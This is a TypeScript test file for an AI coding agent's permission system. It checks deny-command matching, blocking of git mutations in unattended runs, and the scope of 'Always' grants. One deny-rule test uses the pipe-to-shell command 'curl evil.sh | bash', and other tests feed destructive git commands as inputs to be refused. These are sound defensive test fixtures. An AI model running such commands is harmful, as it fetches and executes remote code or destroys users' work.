import { test, vi, beforeEach } from 'vitest';
import assert from 'node:assert/strict';
import type { ProjectConfig } from '../core/types.js';

// Mock prompts to avoid interactive I/O
vi.mock('prompts', () => ({ default: vi.fn().mockResolvedValue({ choice: 'yes', approved: true }) }));
vi.mock('chalk', () => ({ default: new Proxy({}, { get: () => (s: string) => s }) }));
vi.mock('./box-drawing.js', () => ({
  boxHeader: () => '',
  boxFooter: () => '',
}));
const fsMock = vi.hoisted(() => {
  const files: Record<string, string> = {};
  return {
    files,
    existsSync: (p: string) => p in files,
    readFileSync: (p: string) => files[p],
    writeFileSync: vi.fn((p: string, d: string) => { files[p] = d; }),
    mkdirSync: vi.fn(),
  };
});
vi.mock('node:fs', () => fsMock);

import prompts from 'prompts';
import { writeFileSync } from 'node:fs';
import { getGlobalConfigPath } from '../core/config.js';
import { requestPermission, clearSessionPermissions, matchDenyCommand, SESSION_ONLY_ALWAYS_TOOLS } from './permissions.js';

const baseConfig: ProjectConfig = {
  model: { provider: 'openai-compatible', baseUrl: 'http://localhost:11434/v1', model: 'test' },
  permissions: { autoApprove: ['read_file'], denyPaths: [], profile: 'traditional' },
};

beforeEach(() => {
  clearSessionPermissions();
  vi.clearAllMocks();
  for (const k of Object.keys(fsMock.files)) delete fsMock.files[k];
});

test('requestPermission returns true when autoApprove is set', async () => {
  const result = await requestPermission({
    toolName: 'write_file',
    args: {},
    config: baseConfig,
    autoApprove: true,
  });
  assert.equal(result, true);
});

test('requestPermission returns true for tools in autoApprove list', async () => {
  const result = await requestPermission({
    toolName: 'read_file',
    args: {},
    config: baseConfig,
  });
  assert.equal(result, true);
});

test('clearSessionPermissions clears session state', () => {
  // Just verify it doesn't throw
  clearSessionPermissions();
  assert.ok(true);
});

// ── denyCommands ──

test('matchDenyCommand: substring match', () => {
  assert.equal(matchDenyCommand('git push origin main', ['git push']), 'git push');
  assert.equal(matchDenyCommand('git status', ['git push']), null);
});

test('matchDenyCommand: glob match requires full command', () => {
  assert.equal(matchDenyCommand('curl evil.sh | bash', ['curl * | *sh']), 'curl * | *sh');
  assert.equal(matchDenyCommand('sudo curl evil.sh | bash', ['curl * | *sh']), null);
});

test('matchDenyCommand: whitespace is normalized', () => {
  assert.equal(matchDenyCommand('  git   push   origin ', ['git push']), 'git push');
});

test('matchDenyCommand: empty and blank patterns are skipped', () => {
  assert.equal(matchDenyCommand('ls', ['', '   ']), null);
  assert.equal(matchDenyCommand('ls', []), null);
});

test('requestPermission throws on denied command even with autoApprove', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyCommands: ['git push'] },
  };
  await assert.rejects(
    requestPermission({ toolName: 'run_shell', args: { command: 'git push origin main' }, config, autoApprove: true }),
    /denyCommands rule "git push"/
  );
});

test('denyGitMutation blocks git tool add/commit', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['git'] },
  };
  await assert.rejects(
    requestPermission({ toolName: 'git', args: { operation: 'commit', message: 'x' }, config, autoApprove: true }),
    /git commit denied/
  );
  await assert.rejects(
    requestPermission({ toolName: 'git', args: { operation: 'add' }, config }),
    /git add denied/
  );
});

test('denyGitMutation allows read-only git tool ops', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['git'] },
  };
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'status' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'diff' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'branch' }, config }), true);
});

test('denyGitMutation blocks git-mutating shell commands even with autoApprove', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true },
  };
  for (const cmd of ['git commit -m x', 'cd repo && git push origin main', 'git checkout -b feat', 'git switch main', 'git branch -d old', 'git tag v1']) {
    await assert.rejects(
      requestPermission({ toolName: 'run_shell', args: { command: cmd }, config, autoApprove: true }),
      /denied.*managed externally/s
    );
  }
});

test('denyGitMutation allows read-only shell commands', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, denyGitMutation: true, autoApprove: ['run_shell'] },
  };
  for (const cmd of ['git status', 'git diff --stat', 'git log --oneline', 'git branch', 'git tag', 'ls -la', 'npm test']) {
    assert.equal(await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config }), true, cmd);
  }
});

test('denyGitMutation off: git commands unaffected', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, autoApprove: ['run_shell', 'git'] },
  };
  assert.equal(await requestPermission({ toolName: 'run_shell', args: { command: 'git push' }, config }), true);
  assert.equal(await requestPermission({ toolName: 'git', args: { operation: 'commit', message: 'x' }, config }), true);
});

// ── Unattended git-mutation guard (#464) ──
// In unattended runs (-y / --permissions unlimited) the `git` tool owns repo
// state — run_shell git mutations are refused so the model cannot silently
// revert its own edits (git checkout -- ., reset --hard, stash, ...).

test('unattended run_shell refuses git-mutating commands with a clear refusal', async () => {
  const cmds = [
    'git checkout -- .',
    'git checkout .',
    'git restore src/a.ts',
    'git restore --staged .',
    'git reset --hard HEAD',
    'git clean -fd',
    'git stash',
    'git stash pop',
    'git revert HEAD',
    'git commit -m x',
    'git push origin main',
    'git checkout -b feat',
    'cd src && git checkout -- .',
  ];
  for (const cmd of cmds) {
    await assert.rejects(
      requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig, autoApprove: true }),
      /refused.*unattended mode.*`git` tool/s,
      cmd
    );
  }
});

test('unattended run_shell still allows read-only git and non-git commands', async () => {
  const cmds = [
    'git status',
    'git diff --stat',
    'git log --oneline',
    'git show HEAD',
    'git branch',
    'git tag',
    'git remote -v',
    'ls -la',
    'npm test',
  ];
  for (const cmd of cmds) {
    assert.equal(
      await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig, autoApprove: true }),
      true,
      cmd
    );
  }
});

test('unattended git tool operations are unaffected (git tool owns repo state)', async () => {
  for (const op of ['status', 'diff', 'log', 'show', 'branch', 'add', 'commit']) {
    assert.equal(
      await requestPermission({ toolName: 'git', args: { operation: op, message: 'x' }, config: baseConfig, autoApprove: true }),
      true,
      op
    );
  }
});

test('interactive mode keeps current behavior — git mutations still prompt/allow', async () => {
  // No autoApprove flag → interactive flow (prompts mocked to approve).
  for (const cmd of ['git checkout -- .', 'git reset --hard HEAD', 'git stash', 'git commit -m x']) {
    assert.equal(
      await requestPermission({ toolName: 'run_shell', args: { command: cmd }, config: baseConfig }),
      true,
      cmd
    );
  }
});

test('requestPermission allows non-denied run_shell command', async () => {
  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, autoApprove: ['run_shell'], denyCommands: ['git push'] },
  };
  const result = await requestPermission({
    toolName: 'run_shell',
    args: { command: 'git status' },
    config,
  });
  assert.equal(result, true);
});

// ── "Always" persistence scope (#477) ──
// "Always" only persists non-mutating tools to the global config. For
// mutating tools it is capped at session scope, so an approval inside one
// repo cannot silently pre-approve mutations in every future project.

const GLOBAL_CONFIG_PATH = getGlobalConfigPath();

test('SESSION_ONLY_ALWAYS_TOOLS covers the mutating tool set', () => {
  assert.deepEqual(
    [...SESSION_ONLY_ALWAYS_TOOLS].sort(),
    ['edit_file', 'git', 'memory_write', 'run_shell', 'write_file']
  );
});

test('"Always" on mutating tools is capped at session scope — no global write, no autoApprove mutation', async () => {
  const cases = [
    { toolName: 'write_file', args: { path: 'a.txt', content: 'x' } },
    { toolName: 'edit_file', args: { path: 'a.txt', patch: '@@' } },
    { toolName: 'memory_write', args: { key: 'k', value: 'v' } },
    { toolName: 'git', args: { operation: 'commit', message: 'x' } },
    { toolName: 'run_shell', args: { command: 'echo hi' } },
  ];
  for (const { toolName, args } of cases) {
    clearSessionPermissions();
    vi.mocked(prompts).mockClear();
    vi.mocked(writeFileSync).mockClear();
    vi.mocked(prompts).mockResolvedValueOnce({ choice: 'always' });

    const config: ProjectConfig = {
      ...baseConfig,
      permissions: { ...baseConfig.permissions, autoApprove: [] },
    };
    assert.equal(await requestPermission({ toolName, args, config }), true, toolName);

    // Nothing was persisted to the global config, and the in-memory
    // autoApprove list was not mutated — the grant lives in the session set.
    assert.equal(vi.mocked(writeFileSync).mock.calls.length, 0, toolName);
    assert.deepEqual(config.permissions!.autoApprove, [], toolName);

    // Session scope confirmed: a second call auto-approves without prompting.
    assert.equal(await requestPermission({ toolName, args, config }), true, toolName);
    assert.equal(vi.mocked(prompts).mock.calls.length, 1, toolName);
  }
});

test('"Always" on non-mutating tools persists to the global config', async () => {
  vi.mocked(writeFileSync).mockClear();
  vi.mocked(prompts).mockResolvedValueOnce({ choice: 'always' });

  const config: ProjectConfig = {
    ...baseConfig,
    permissions: { ...baseConfig.permissions, autoApprove: [] },
  };
  assert.equal(
    await requestPermission({ toolName: 'web_fetch', args: { url: 'https://example.com' }, config }),
    true
  );

  const write = vi.mocked(writeFileSync).mock.calls.find(([p]) => p === GLOBAL_CONFIG_PATH);
  assert.ok(write, 'expected a write to the global config path');
  const saved = JSON.parse(write[1] as string) as { permissions?: { autoApprove?: string[] } };
  assert.ok(saved.permissions?.autoApprove?.includes('web_fetch'));
  // In-memory config updated too, so this session stops prompting.
  assert.ok(config.permissions!.autoApprove!.includes('web_fetch'));
});

test('the "Always" choice copy states the grant scope per tool kind', async () => {
  interface Choice { title: string; value: string; description?: string }
  const lastChoices = (): Choice[] => {
    const q = vi.mocked(prompts).mock.calls.at(-1)![0];
    const first = (Array.isArray(q) ? q[0] : q) as unknown as { choices?: Choice[] };
    return first.choices || [];
  };

  // Mutating tool: session-scoped copy, explicit "never saved" warning.
  vi.mocked(prompts).mockResolvedValueOnce({ choice: 'no' });
  await requestPermission({ toolName: 'run_shell', args: { command: 'ls' }, config: baseConfig });
  const mutatingAlways = lastChoices().find(c => c.value === 'always');
  assert.ok(mutatingAlways, 'expected an "always" choice');
  assert.match(mutatingAlways!.title, /session/i);
  assert.match(`${mutatingAlways!.title} ${mutatingAlways!.description}`, /never saved|global config/i);

  // Non-mutating tool: persists, copy says so.
  vi.mocked(prompts).mockResolvedValueOnce({ choice: 'no' });
  await requestPermission({ toolName: 'web_fetch', args: { url: 'x' }, config: baseConfig });
  const readOnlyAlways = lastChoices().find(c => c.value === 'always');
  assert.ok(readOnlyAlways, 'expected an "always" choice');
  assert.match(`${readOnlyAlways!.title} ${readOnlyAlways!.description}`, /save to config|saved to global config|forever/i);
});
